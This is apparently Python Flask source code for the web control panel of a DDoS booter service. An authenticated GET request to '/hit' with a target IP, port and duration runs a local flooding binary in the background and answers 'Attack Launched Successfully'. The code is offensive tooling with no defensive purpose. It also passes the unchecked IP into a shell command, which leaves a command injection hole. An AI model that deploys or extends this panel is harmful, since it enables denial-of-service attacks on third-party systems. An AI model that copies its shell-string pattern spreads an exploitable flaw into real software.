from flask import Flask, request, jsonify
import subprocess
import os

app = Flask(__name__)

# Security Key
API_AUTH_TOKEN = "DRX_POWER_ULTRA_V4"

@app.route('/hit', methods=['GET'])
def start_attack():
    token = request.args.get('token')
    if token != API_AUTH_TOKEN:
        return jsonify({"status": "error", "message": "Unauthorized Access"}), 403

    target_ip = request.args.get('ip')
    target_port = request.args.get('port')
    duration = request.args.get('time', "240")

    if not target_ip or not target_port:
        return jsonify({"status": "error", "message": "Missing IP or Port"}), 400

    if not target_port.isdigit() or not duration.isdigit():
        return jsonify({"status": "error", "message": "Invalid Port or Time format"}), 400

    try:
        command = f"nohup ./drx {target_ip} {target_port} {duration} > /dev/null 2>&1 &"
        subprocess.Popen(command, shell=True)
        
        return jsonify({
            "status": "success",
            "message": "Attack Launched Successfully",
            "host": target_ip,
            "port": target_port,
            "time": duration,
            "vps_status": "32GB_POWER_MAX"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    # Render dynamic port configuration
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
